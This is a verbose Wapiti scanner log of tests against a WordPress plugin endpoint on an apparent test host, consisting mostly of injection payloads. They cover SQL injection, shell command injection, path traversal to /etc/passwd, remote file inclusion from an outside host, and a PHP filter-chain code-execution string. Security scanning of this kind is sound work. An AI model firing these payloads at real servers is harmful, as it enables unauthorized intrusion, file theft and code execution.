2024-03-21 15:13:50.997 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=fuzz (0)
2024-03-21 15:13:51.135 | GREEN    | wapitiCore.controller.wapiti:save_scan_state:359 - [*] Saving scan state, please wait...
2024-03-21 15:13:51.135 | INFO     | wapitiCore.controller.wapiti:save_scan_state:363 - This scan has been saved in the file /home/wapiti/.wapiti/scans/web_folder_36bf316d.db
2024-03-21 15:13:51.138 | INFO     | wapitiCore.main.wapiti:wapiti_main:380 - [*] Wapiti found 1 URLs and forms during the scan
2024-03-21 15:13:51.169 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:289 - [*] Existing modules:
2024-03-21 15:13:51.169 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:290 - 	 backup, brute_login_form, buster, cookieflags, crlf, csp, csrf, drupal_enum, exec, file, htaccess, htp, http_headers, https_redirect, log4shell, methods, nikto, permanentxss, redirect, shellshock, spring4shell, sql, ssl, ssrf, takeover, timesql, upload, wapp, wp_enum, xss, xxe
2024-03-21 15:13:51.239 | ERROR    | wapitiCore.controller.wapiti:_load_attack_modules:298 - [!] Unable to import module ssl: No module named 'humanize'
2024-03-21 15:13:51.281 | ERROR    | wapitiCore.controller.wapiti:filter_modules_with_options:130 - [!] Unable to find a module named ssl
2024-03-21 15:13:51.281 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module xss
2024-03-21 15:13:51.295 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=fuzz (0)
2024-03-21 15:13:51.331 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module sql
2024-03-21 15:13:51.343 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=fuzz (0)
2024-03-21 15:13:51.343 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=fuzz%C2%BF%27%22%28 (0)
2024-03-21 15:13:51.354 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=fuzz%20AND%2080%3D116%20AND%2022%3D22 (0)
2024-03-21 15:13:51.359 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=fuzz%27%20AND%2066%3D101%20AND%20%2798%27%3D%2798 (0)
2024-03-21 15:13:51.365 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=fuzz%22%20AND%2049%3D70%20AND%20%2257%22%3D%2257 (0)
2024-03-21 15:13:51.373 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=fuzz%29%20AND%2072%3D149%20AND%20%2828%3D28 (0)
2024-03-21 15:13:51.379 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=fuzz%27%29%20AND%2062%3D156%20AND%20%28%2713%27%3D%2713 (0)
2024-03-21 15:13:51.385 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=fuzz%22%29%20AND%2053%3D94%20AND%20%28%2292%22%3D%2292 (0)
2024-03-21 15:13:51.407 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module exec
2024-03-21 15:13:51.419 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=fuzz (0)
2024-03-21 15:13:51.421 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=%3Benv%3B (0)
2024-03-21 15:13:51.426 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=%7Cenv%7C (0)
2024-03-21 15:13:51.432 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=a%3Benv%3B (0)
2024-03-21 15:13:51.436 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=a%3Benv%3B (0)
2024-03-21 15:13:51.441 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C (0)
2024-03-21 15:13:51.447 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=fuzz%3Benv%3B (0)
2024-03-21 15:13:51.453 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=fuzz%0Aenv%3B (0)
2024-03-21 15:13:51.458 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=%26set%26 (0)
2024-03-21 15:13:51.463 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=set (0)
2024-03-21 15:13:51.469 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=env (0)
2024-03-21 15:13:51.474 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=%2Fe%00 (0)
2024-03-21 15:13:51.479 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-21 15:13:51.485 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-21 15:13:51.490 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-21 15:13:51.496 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-21 15:13:51.501 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-21 15:13:51.507 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-21 15:13:51.513 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-21 15:13:51.518 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-21 15:13:51.523 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-21 15:13:51.528 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-21 15:13:51.533 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-21 15:13:51.539 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-21 15:13:51.546 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D (0)
2024-03-21 15:13:51.551 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=a%60%29%60 (0)
2024-03-21 15:13:51.556 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=a%60sleep%2060%60 (0)
2024-03-21 15:13:51.562 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=a%3Bsleep%2060%3B (0)
2024-03-21 15:13:51.568 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=a%7Csleep%2060%3B (0)
2024-03-21 15:13:51.572 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=%26ping%20-n%2025%20127.0.0.1%26 (0)
2024-03-21 15:13:51.606 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module cookieflags
2024-03-21 15:13:51.629 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=fuzz (0)
2024-03-21 15:13:51.645 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module http_headers
2024-03-21 15:13:51.659 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=fuzz (0)
2024-03-21 15:13:51.665 | BLUE     | wapitiCore.attack.mod_http_headers:check_header:83 - Checking X-Frame-Options:
2024-03-21 15:13:51.666 | RED      | wapitiCore.attack.mod_http_headers:check_header:85 - X-Frame-Options is not set
2024-03-21 15:13:51.721 | BLUE     | wapitiCore.attack.mod_http_headers:check_header:83 - Checking X-Content-Type-Options:
2024-03-21 15:13:51.721 | RED      | wapitiCore.attack.mod_http_headers:check_header:85 - X-Content-Type-Options is not set
2024-03-21 15:13:51.791 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module redirect
2024-03-21 15:13:51.802 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=fuzz (0)
2024-03-21 15:13:51.803 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=https%3A%2F%2Fopenbugbounty.org%2F
2024-03-21 15:13:51.810 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=%2F%2Fopenbugbounty.org%2F
2024-03-21 15:13:51.829 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module file
2024-03-21 15:13:51.840 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=fuzz (0)
2024-03-21 15:13:51.842 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php (0)
2024-03-21 15:13:51.848 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00 (0)
2024-03-21 15:13:51.853 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=%2Fetc%2Fpasswd (0)
2024-03-21 15:13:51.859 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=%2Fetc%2Fpasswd%00 (0)
2024-03-21 15:13:51.866 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=%2Fetc%2Fservices (0)
2024-03-21 15:13:51.872 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=%2Fetc%2Fservices%00 (0)
2024-03-21 15:13:51.878 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices (0)
2024-03-21 15:13:51.883 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00 (0)
2024-03-21 15:13:51.889 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA (0)
2024-03-21 15:13:51.895 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-21 15:13:51.901 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-21 15:13:51.907 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA (0)
2024-03-21 15:13:51.914 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F (0)
2024-03-21 15:13:51.920 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F (0)
2024-03-21 15:13:51.926 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
2024-03-21 15:13:51.933 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
2024-03-21 15:13:51.938 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
2024-03-21 15:13:51.943 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
2024-03-21 15:13:51.948 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
2024-03-21 15:13:51.953 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
2024-03-21 15:13:51.958 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
2024-03-21 15:13:51.962 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
2024-03-21 15:13:51.967 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-21 15:13:51.972 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-21 15:13:51.977 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-21 15:13:51.982 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-21 15:13:51.987 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp (0)
2024-03-21 15:13:51.992 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
2024-03-21 15:13:51.997 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
2024-03-21 15:13:52.002 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
2024-03-21 15:13:52.007 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
2024-03-21 15:13:52.012 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
2024-03-21 15:13:52.017 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
2024-03-21 15:13:52.022 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
2024-03-21 15:13:52.027 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
2024-03-21 15:13:52.031 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-21 15:13:52.036 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-21 15:13:52.041 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-21 15:13:52.046 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/totop-link/totop-link.css.php?vars=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
